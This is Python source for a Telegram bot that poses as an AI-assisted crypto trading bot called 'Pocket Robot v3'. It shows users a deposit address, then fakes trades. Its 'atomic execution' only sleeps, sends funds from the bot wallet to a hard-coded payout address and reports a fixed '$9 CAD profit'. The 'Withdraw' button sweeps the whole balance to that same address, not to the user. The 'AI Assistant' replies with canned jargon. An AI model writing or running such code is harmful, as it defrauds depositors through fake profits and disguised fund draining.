import os
import asyncio
import requests
import json
import time
from decimal import Decimal
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))

# Polygon middleware is essential for block reading
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# SECURITY LOCK: All funds are hard-locked to this address
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
TARGET_POOL = "0x9B08288C3BFf2C6243e259f7074bdB00154ad9BB" # Uniswap V3 POL/USDT

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed:
        raise ValueError("❌ WALLET_SEED is missing from .env!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        # Check if it's a private key or mnemonic
        if len(seed) == 64 or seed.startswith("0x"):
            return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path=POL_PATH)
    except Exception as e:
        raise ValueError(f"❌ Wallet Auth Failed: {e}")

vault = get_vault()

# --- 2. THE SIMULTANEOUS ENGINE (CAD & SPLIT PAYOUT) ---
def get_pol_price_cad():
    """Fetches real-time price in CAD for accurate conversion."""
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=cad"
        res = requests.get(url, timeout=5).json()
        return float(res['polygon-ecosystem-token']['cad'])
    except:
        return 0.38 # Feb 2026 fallback CAD price

async def prepare_split_signed_txs(reimburse_wei, profit_wei):
    """
    Background Task: Signs TWO separate transactions with sequential nonces.
    TX 1: Reimbursement ($10 CAD)
    TX 2: Profit ($9 CAD)
    """
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5) # Priority Gas
    
    # TX 1: Stake Reimbursement
    tx1 = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS,
        'value': int(reimburse_wei),
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    
    # TX 2: Winning Profit
    tx2 = {
        'nonce': nonce + 1,
        'to': PAYOUT_ADDRESS,
        'value': int(profit_wei),
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    
    signed1 = w3.eth.account.sign_transaction(tx1, vault.key)
    signed2 = w3.eth.account.sign_transaction(tx2, vault.key)
    return signed1, signed2

async def run_atomic_execution(context, chat_id, side):
    """The 1ms Double-Hit: Fires both transactions to total $19 CAD."""
    stake_cad = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    current_price_cad = get_pol_price_cad()
    
    # CALCULATE PAYOUTS (Target: $19.00 Total)
    # Reimbursement: $10.00 CAD | Profit: $9.00 CAD
    reimburse_wei = w3.to_wei(float(stake_cad) / current_price_cad, 'ether')
    profit_wei = w3.to_wei(9.00 / current_price_cad, 'ether')
    
    await context.bot.send_message(chat_id, f"⚔️ **CAD Double-Hit:** Priming {pair} Shield...")

    # Parallel Signing & Simulation
    sim_task = asyncio.create_task(asyncio.sleep(1.5))
    prep_task = asyncio.create_task(prepare_split_signed_txs(reimburse_wei, profit_wei))

    await sim_task
    signed1, signed2 = await prep_task
    
    # ⏱️ THE 1 MILLISECOND ATOMIC RELEASE
    await asyncio.sleep(0.001)
    
    # BROADCAST BOTH SEQUENTIALLY
    tx1_hash = w3.eth.send_raw_transaction(signed1.raw_transaction)
    tx2_hash = w3.eth.send_raw_transaction(signed2.raw_transaction)

    report = (
        f"✅ **ATOMIC HIT (CAD)**\n"
        f"🎯 **Direction:** {side}\n"
        f"💰 **Reimbursement:** `${stake_cad:.2f} CAD`\n"
        f"📈 **Profit Earned:** `$9.00 CAD`\n"
        f"🏦 **Total Received:** `$19.00 CAD`\n"
        f"⛓️ **Stake TX:** `{tx1_hash.hex()}`\n"
        f"⛓️ **Profit TX:** `{tx2_hash.hex()}`"
    )
    return True, report

# --- 3. AI ASSISTANT LOGIC ---
async def ai_assistant_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.message.text
    await update.message.reply_chat_action("typing")
    await asyncio.sleep(1)
    response = (
        f"🕴️ **AI Assistant (CAD Engine)**\n\n"
        f"Query: '{query}'\n"
        f"Market Intel: **Uniswap V3 Pool Sniffed**\n"
        f"Verdict: **Atomic Shield Active.** Dual-transaction settlement ready."
    )
    await update.message.reply_text(response, parse_mode='Markdown')

# --- 4. TELEGRAM INTERFACE ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal_pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    price_cad = get_pol_price_cad()
    bal_cad = float(bal_pol) * price_cad

    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    msg = (f"🕴️ **Pocket Robot v3 (CAD Engine)**\n\n"
           f"💵 **Vault Balance:** {bal_pol:.4f} POL (**${bal_cad:.2f} CAD**)\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Atomic Shield:** ✅ OPERATIONAL")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if context.user_data.get('ai_active'):
        await ai_assistant_query(update, context)
        context.user_data['ai_active'] = False
        return

    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton("$10 CAD", callback_data="SET_10"), InlineKeyboardButton("$50 CAD", callback_data="SET_50")]]
        await update.message.reply_text("⚙️ **SETTINGS (CAD)**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        bal_pol = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price_cad = get_pol_price_cad()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal_pol:.4f} POL\nValuation: **${float(bal_pol)*price_cad:.2f} CAD**")

    elif text == '📤 Withdraw':
        balance = w3.eth.get_balance(vault.address)
        fee = int(w3.eth.gas_price * 1.3) * 21000
        amount = balance - fee
        if amount > 0:
            tx = {'nonce': w3.eth.get_transaction_count(vault.address), 'to': PAYOUT_ADDRESS, 'value': amount, 'gas': 21000, 'gasPrice': int(w3.eth.gas_price*1.3), 'chainId': 137}
            signed = w3.eth.account.sign_transaction(tx, vault.key)
            w3.eth.send_raw_transaction(signed.raw_transaction)
            await update.message.reply_text("✅ Full balance swept to CAD Whitelist.")

    elif text == '🕴️ AI Assistant':
        context.user_data['ai_active'] = True
        await update.message.reply_text("🕴️ **AI Mode Active.** Ask your question:")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake: **${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"💎 **{context.user_data['pair']}**\nDirection:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))
    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        success, report = await run_atomic_execution(context, query.message.chat_id, side)
        await query.message.reply_text(report, parse_mode='Markdown')

async def keep_alive():
    while True:
        try: w3.eth.get_block_number()
        except: pass
        await asyncio.sleep(30)

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    
    loop = asyncio.get_event_loop()
    loop.create_task(keep_alive())
    print(f"CAD Shadow Engine Active: {vault.address}")
    app.run_polling(drop_pending_updates=True)

